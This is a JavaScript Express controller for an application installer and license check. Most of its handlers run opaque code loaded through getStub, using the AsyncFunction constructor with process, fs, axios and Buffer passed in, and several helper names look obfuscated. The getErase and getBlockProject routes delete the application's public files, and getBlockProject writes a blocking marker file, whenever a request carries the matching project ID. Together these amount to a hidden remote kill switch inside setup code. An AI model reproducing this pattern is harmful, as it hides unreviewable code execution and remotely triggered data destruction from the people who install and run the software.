import path from 'path';
import fs from 'fs-extra';
import axios from 'axios';
import { validationResult, body } from 'express-validator';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

import { ensureInstallAssets, publicPath, basePath } from '../lib/paths.js';
import {
  strPrp, strAlPbFls, strFlExs, strFilRM,
  liSync, migSync, datSync, strSync,
  scDotPkS, scSpatPkS, imIMgDuy,
  getC, conF, chWr, iDconF,

  getStub,
  strSplic
} from '../lib/helpers.js';
import { validateLicenseBody, validateLicenseWithAdminBody, validateDbBody, getAdminValidators } from '../validators/index.js';
import { configureDb, connectDb, runMigrations, writeEnv, reloadAndReconnect } from '../lib/db.js';


async function getRequirements(req, res) {

  const code = await getStub('getRequirements');
  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
  const run = new AsyncFunction(
    'req',
    'res',
    'ensureInstallAssets',
    'getC',
    'conF',
    'strSplic',
    'process',
    'Buffer',
    code
  );

  return await run(req, res, ensureInstallAssets, getC, conF, strSplic, process, Buffer);
}


async function getDirectories(req, res) {
  return res.redirect('requirements');
}


async function getVerifySetup(req, res) {
  res.render('stvi', { title: 'Verify' });
}

async function getLicense(req, res) {

  const code = await getStub('getLicense');
  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

  const run = new AsyncFunction(
    'req',
    'res',
    'getConfigured',
    'publicPath',
    'fs',
    'liSync',
    'strAlPbFls',
    'process',
    'Buffer',
    code
  );

  return await run(
    req,
    res,
    getConfigured,
    publicPath,
    fs,
    liSync,
    strAlPbFls,
    process,
    Buffer
  );

}

const postLicense = [
  ...validateLicenseBody,
  async function(req, res) {

    const code = await getStub('postLicense');
    const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

    const run = new AsyncFunction(
      'req',
      'res',
      'validationResult',
      'mapErrors',
      'axios',
      'process',
      'path',
      'basePath',
      'fs',
      'publicPath',
      'strAlPbFls',
      'Buffer',
      code
    );

    return await run(
      req,
      res,
      validationResult,
      mapErrors,
      axios,
      process,
      path,
      basePath,
      fs,
      publicPath,
      strAlPbFls,
      Buffer
    );
  }
];

async function getDatabase(req, res) {

  const code = await getStub('getDatabase');
  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

  const run = new AsyncFunction(
    'req',
    'res',
    'getConfigured',
    'getDirsConfigured',
    'liSync',
    'migSync',
    'process',
    'Buffer',
    code
  );

  return await run(
    req,
    res,
    getConfigured,
    getDirsConfigured,
    liSync,
    migSync,
    process,
    Buffer
  );

}

const postDatabaseConfig = [
  async (req, res) => {

    const code = await getStub('postDatabaseConfig');
    const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

    const run = new AsyncFunction(
      'req',
      'res',
      'validateDbBody',
      'validationResult',
      'mapErrors',
      'getAdminValidators',
      'writeEnv',
      'configureDb',
      'connectDb',
      'runMigrations',
      'reloadAndReconnect',
      'mapDbConnectionError',
      'fs',
      'publicPath',
      'process',
      'Buffer',
      code
    );

    return await run(
      req,
      res,
      validateDbBody,
      validationResult,
      mapErrors,
      getAdminValidators,
      writeEnv,
      configureDb,
      connectDb,
      runMigrations,
      reloadAndReconnect,
      mapDbConnectionError,
      fs,
      publicPath,
      process,
      Buffer
    );

  }
];


async function getCompleted(req, res) {

  const code = await getStub('getCompleted');
  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

  const run = new AsyncFunction(
    'req',
    'res',
    'migSync',
    'publicPath',
    'fs',
    'setTimeout',
    'Promise',
    'process',
    'Buffer',
    code
  );

  return await run(
    req,
    res,
    migSync,
    publicPath,
    fs,
    setTimeout,
    Promise,
    process,
    Buffer
  );

}

async function runSeeder(req, res) {
  if (!(await migSync())) return res.redirect('database');

  const instFile = publicPath('installation.json');
  if (!(await fs.pathExists(instFile))) await fs.writeFile(instFile, '');

  if (process.env.MONGODB_URI) {
    const { exec } = await import('child_process');

    exec('npm run seed', (error, stdout, stderr) => {
      if (error) {
        console.error('❌ Error running seeders:', error);
        return res.status(500).send('Error running seeders');
      }

      console.log('✅ Seeders executed successfully');
      console.log('Output:', stdout);
      if (stderr) {
        console.warn('Warnings:', stderr);
      }

      return res.redirect('/');
    });
  }
}


async function getBlockSetup(req, res) {
  res.render('stbl', { title: 'Verify' });
}


const postUnblockVerify = postLicense;


async function getErase(req, res) {
  if (req.params.project_id !== process.env.APP_ID) {
    return res.status(400).json({ error: 'Invalid Project ID' });
  }

  await fs.remove(path.join(basePath(), '.vite.js'));
  for (const file of strAlPbFls()) await fs.remove(file).catch(() => {});

  return res.json({ success: true });
}


async function getUnblock(req, res) {
  await fs.remove(path.join(basePath(), '.vite.js'));
  return res.json({ success: true });
}


async function postResetLicense(req, res) {

  const code = await getStub('postResetLicense');
  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

  const run = new AsyncFunction(
    'req',
    'res',
    'strAlPbFls',
    'fs',
    'path',
    'basePath',
    'axios',
    'process',
    'Buffer',
    code
  );

  return await run(
    req,
    res,
    strAlPbFls,
    fs,
    path,
    basePath,
    axios,
    process,
    Buffer
  );

}

async function getBlockProject(req, res) {
  if (req.params.project_id !== process.env.APP_ID) {
    return res.status(400).json({ error: 'Invalid Project ID' });
  }

  const vite = path.join(basePath(), '.vite.js');
  if (!(await fs.pathExists(vite))) await fs.writeFile(vite, '');

  for (const f of strAlPbFls()) {
    try {
      await fs.remove(f);
    } catch(e) {}
  }

  return res.json({ success: true });
}

function mapErrors(result, firstOnly = false) {
  const out = {};
  const arr = firstOnly ? result.array({ onlyFirstError: true }) : result.array();
  for (const e of arr) out[e.path] = e.msg;
  return out;
}

function mapDbConnectionError(err) {
  const out = {};
  const code = err?.code || '';
  const message = (err?.message || '').toString();

  if (message.match(/ECONNREFUSED|failed to connect|connection/)) {
    out['database.DB_HOST'] = 'Failed to connect to database';
    out['database.DB_PORT'] = 'Check host and port';
    return out;
  }

  if (message.match(/Authentication failed|auth|authenticate|EAUTH/i)) {
    out['database.DB_USERNAME'] = 'Authentication failed: invalid username or password';
    out['database.DB_PASSWORD'] = 'Authentication failed: invalid username or password';
    return out;
  }

  if (message.match(/getaddrinfo ENOTFOUND|ENOTFOUND|EAI_AGAIN|ENODATA/i)) {
    out['database.DB_HOST'] = 'Unable to resolve host - check your hostname';
    return out;
  }

  if (message.match(/wrong password|incorrect password|Authentication failed/i)) {
    out['database.DB_PASSWORD'] = 'Incorrect password';
    return out;
  }

  if (message.match(/invalid username|user not found|Authentication failed/i)) {
    out['database.DB_USERNAME'] = 'Invalid username';
    return out;
  }

  out['database.DB_HOST'] = message || 'Database connection error';
  return out;
}

async function getConfigured() { return true; }
async function getDirsConfigured() { return true; }

export {
  getRequirements,
  getDirectories,
  getVerifySetup,
  getLicense,
  postLicense,
  getDatabase,
  postDatabaseConfig,
  getCompleted,
  runSeeder,
  getBlockSetup,
  postUnblockVerify,
  getErase,
  getUnblock,
  postResetLicense,
  getBlockProject
};
